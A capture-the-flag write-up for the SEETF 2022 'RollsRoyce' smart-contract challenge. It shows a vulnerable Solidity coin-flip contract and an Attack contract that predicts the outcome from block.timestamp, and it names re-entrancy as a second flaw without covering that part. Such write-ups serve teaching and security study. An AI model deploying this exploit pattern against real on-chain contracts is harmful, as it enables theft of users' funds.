# RollsRoyce

This was a smart-contract challenge that was part of the recent [SEETF 2022](https://ctftime.org/event/1543/) hosted by the [Social Engineering Experts](https://seetf.sg/seetf/).
Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on `block.timestamp` being used as a random generator, and a [re-entrancy attack](https://hackernoon.com/hack-solidity-reentrancy-attack). 

We are given this `RollsRoyce.sol` contract as shown below:
```solidity
pragma solidity ^0.8.0;

contract RollsRoyce {
    enum CoinFlipOption {
        HEAD,
        TAIL
    }

    address private bettingHouseOwner;
    address public currentPlayer;
    CoinFlipOption userGuess;
    mapping(address => uint) playerConsecutiveWins;
    mapping(address => bool) claimedPrizeMoney;
    mapping(address => uint) playerPool;

    constructor() payable {
        bettingHouseOwner = msg.sender;
    }

    receive() external payable {}

    function guess(CoinFlipOption _guess) external payable {
        require(currentPlayer == address(0), "There is already a player");
        require(msg.value == 1 ether, "To play it needs to be 1 ether");

        currentPlayer = msg.sender;
        depositFunds(msg.sender);
        userGuess = _guess;
    }

    function revealResults() external {
        require(
            currentPlayer == msg.sender,
            "Only the player can reveal the results"
        );

        CoinFlipOption winningOption = flipCoin();

        if (userGuess == winningOption) {
            playerConsecutiveWins[currentPlayer] =
                playerConsecutiveWins[currentPlayer] +
                1;
        } else {
            playerConsecutiveWins[currentPlayer] = 0;
        }
        currentPlayer = address(0);
    }

    function flipCoin() private view returns (CoinFlipOption) {
        return
            CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function viewWins(address _addr) public view returns (uint) {
        return playerConsecutiveWins[_addr];
    }

    function depositFunds(address _to) internal {
        playerPool[_to] += msg.value;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }

    function withdrawPrizeMoney(address _to) public payable {
        require(
            msg.sender == _to,
            "Only the player can withdraw the prize money"
        );
        require(
            playerConsecutiveWins[_to] >= 3,
            "You need to win 3 or more consecutive games to claim the prize money"
        );

        if (playerConsecutiveWins[_to] >= 3) {
            uint prizeMoney = playerPool[_to];
            playerPool[_to] = 0;
            sendValue(payable(_to), prizeMoney);
        }
    }

    function withdrawFirstWinPrizeMoneyBonus() external {
        require(
            !claimedPrizeMoney[msg.sender],
            "You have already claimed the first win bonus"
        );
        playerPool[msg.sender] += 1 ether;
        withdrawPrizeMoney(msg.sender);
        claimedPrizeMoney[msg.sender] = true;
    }

    function isSolved() public view returns (bool) {
        // Return true if the game is solved
        return address(this).balance == 0;
    }
}
```

Based on the source code of the contract itself, we can learn a couple of things

- The contract is basically a coin flipping game.
- The `guess()` function essentially allows us to enter the game and make a guess, making the address who called this function the `currentPlayer`.
- The `revealResults()` function makes a `flipCoin()` and uses that as the comparison against the `guess()`.
- If you win a coin flip 3 times consecutively, you can claim claim all the ether you've won plus 1 additional ether through `WithdrawFirstWinPrizeMoneyBonus()`
  - This additional 1 ether bonus only applies on your first win.
- We solve the problem when we drain all the funds from the contract itself.
  - We can determine the amount of funds in the contract by running `web3.eth.getBalance(contractAddress)`, which tells us that there's 5 ether in the contract itself when we deploy the contract.


## Exploit 1 - Predictable Block Timestamp
Let's take a look at how the results of the `flipCoin()` function gets generated
```solidity
function flipCoin() private view returns (CoinFlipOption) {
    return
        CoinFlipOption(
            uint(
                keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
            ) % 2
        );
}
```

- `keccak256(abi.encodePacked(block.timestamp ^ 0x1F2Df76A6))` -- According to the [documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties:~:text=keccak256(abi.encodePacked(a%2C%20b))%20is%20a%20way%20to%20compute%20the%20hash%20of%20structured%20data), this computes the hash of some structured data. 

What is interesting to us is the use of `block.timestamp` over here, which according to the [solidity documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties), is essentially the current block's timestamp in seconds --> in other words, a deterministic value.

So I guess the question is, how do we exploit this idea? When a transaction is made, it gets stored onto a block and it is this particular block's timestamp that we are interested in. 

In order to exploit this, we first got to perform the `guess()` function along with the `revealResults()` function in the same transaction, so something like this:

```solidity
contract Attack {
    RollsRoyce victim;
    address owner;

    constructor(address payable _addr) public payable {
        owner = msg.sender;
        victim = RollsRoyce(_addr);
    }

    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint256(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function win() public payable {
        require(address(this).balance >= 1 ether, "Send contract some ether");
        RollsRoyce.CoinFlipOption result = flipCoin();
        victim.guess{value: 1 ether}(result);
        victim.revealResults();
    }
}
```
Essentially, the `win()` function basically tries to call `guess()` and `revealResults()` in the same transaction, therefore making `block.timestamp` a deterministic value which allows us to predict the result of the `flipCoin()` function and making an accurate `guess()`.

We can then deploy this `Attack` contract and transfer some ether to it. We can verify that our `win()` function is indeed working as intended by calling the function multiple times and verifying against the `viewWins()` function in the deployed RollsRoyce contract as shown below

<RollsRoyce Win Image>